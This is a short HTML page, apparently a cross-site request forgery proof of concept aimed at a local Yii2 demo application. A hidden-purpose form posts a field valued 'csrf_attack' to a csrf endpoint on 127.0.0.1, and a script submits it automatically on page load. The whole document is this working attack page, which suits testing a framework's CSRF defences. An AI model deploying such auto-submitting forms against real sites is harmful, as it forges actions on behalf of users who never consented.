<form action="http://127.0.0.1/Yii/yii2-demo/web/index.php?r=csrf/csrf"  method="post" id="form">
<input type="text" name="post_title" value="csrf_attack" />
</form>

<script>
    document.getElementById('form').submit();
</script>